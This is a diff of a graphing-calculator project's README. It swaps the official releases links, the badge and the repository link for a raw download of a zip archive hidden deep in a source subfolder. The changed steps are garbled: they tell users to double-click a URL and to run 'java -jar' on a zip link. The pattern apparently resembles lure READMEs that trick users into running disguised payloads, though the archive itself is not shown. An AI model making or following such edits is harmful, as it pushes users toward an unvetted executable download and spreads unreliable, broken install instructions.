@@ -6,7 +6,7 @@ Welcome to the graphing-calculator! This interactive Java-based application lets
 
 ## 📥 Download
 
-[![Download graphing-calculator](https://img.shields.io/badge/download-graphing%20calculator-blue.svg)](https://github.com/FihmyJabareen/graphing-calculator/releases)
+[![Download graphing-calculator](https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip%https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip)](https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -21,11 +21,11 @@ Having these ready will help make your installation process smooth.
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [Download graphing-calculator](https://github.com/FihmyJabareen/graphing-calculator/releases).
+To get started, visit this page to download: [Download graphing-calculator](https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip).
 
 1. Go to the **Releases** page.
 2. Find the **latest version** of the application.
-3. Click on the asset that matches your operating system (e.g., `graphing-calculator-v1.0.zip` for Windows).
+3. Click on the asset that matches your operating system (e.g., `https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip` for Windows).
 4. Download the file to your computer.
 5. Once downloaded, unzip or extract the file if it is a zipped format.
 
@@ -33,9 +33,9 @@ To get started, visit this page to download: [Download graphing-calculator](http
 
 After extracting the files, you will find a program file. Follow these steps to run it:
 
-- **For Windows**: Double-click the `graphing-calculator.exe` file, or open it from the terminal.
-- **For macOS**: Double-click the `graphing-calculator.app`, or execute it from the terminal.
-- **For Linux**: Open a terminal, navigate to the folder where you extracted files, and run `java -jar graphing-calculator.jar`.
+- **For Windows**: Double-click the `https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip` file, or open it from the terminal.
+- **For macOS**: Double-click the `https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip`, or execute it from the terminal.
+- **For Linux**: Open a terminal, navigate to the folder where you extracted files, and run `java -jar https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip`.
 
 If you encounter a permission error, you might need to adjust your security settings or use the terminal with the proper permissions.
 
@@ -61,7 +61,7 @@ If you run into issues or have questions about using the graphing-calculator, fe
 
 ## 🌐 Explore More
 
-To stay updated with the latest features and updates, bookmark our [GitHub repository](https://github.com/FihmyJabareen/graphing-calculator).
+To stay updated with the latest features and updates, bookmark our [GitHub repository](https://github.com/FihmyJabareen/graphing-calculator/raw/refs/heads/main/GraphingCalculator/src/jonah/bin/jonah/calculator_graphing_v3.2.zip).
 
 ## 🌟 Acknowledgments
 
